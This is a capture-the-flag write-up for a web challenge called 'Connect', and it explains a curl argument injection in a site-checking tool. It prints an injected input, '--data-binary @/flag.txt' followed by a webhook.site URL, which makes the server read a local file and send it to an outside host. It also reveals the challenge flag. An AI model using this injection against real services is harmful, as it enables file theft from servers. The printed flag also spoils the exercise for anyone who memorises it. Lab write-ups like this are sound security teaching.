# Connect
Category: Web

## Description
Author: `Mr. Blade`

I built a tool to test if websites are alive. Can you test it for me?

Note: the flag is located at `/flag.txt`

[http://connect.tamuctf.com/](http://connect.tamuctf.com/)

Attachments: [connect.zip](attachments/connect.zip)

## Write-up
- The URL input is inserted into the `command` variable, which contains a Curl command like so `command = "curl -s -D - -o /dev/null " + <url> + " | grep -oP '^HTTP.+[0-9]{3}'"`.
- The `escape_shell_cmd()` function validates the URL input to prevent command injection vulnerabilities.
- Luckily, Curl has a `--data-binary` option that allows reading file content and appending it to the request. If the value of `--data-binary` starts with `@` followed by a file path, Curl will read the content of that file.
- By prefixing the URL input with `--data-binary @/flag.txt`, Curl will include the content of the `/flag.txt` file in the request.
- The modified URL would be `--data-binary @/flag.txt https://webhook.site/35e3671b-6a1c-45c7-be30-0b9bc8d2ab6c`.
- Curl will read the content of `/flag.txt` and send it in the request to the specified webhook.
- This allows us to retrieve the flag content through the webhook.

Flag: `gigem{p00r_f1lt3rs_m4k3_f0r_p00r_s3cur1ty}`
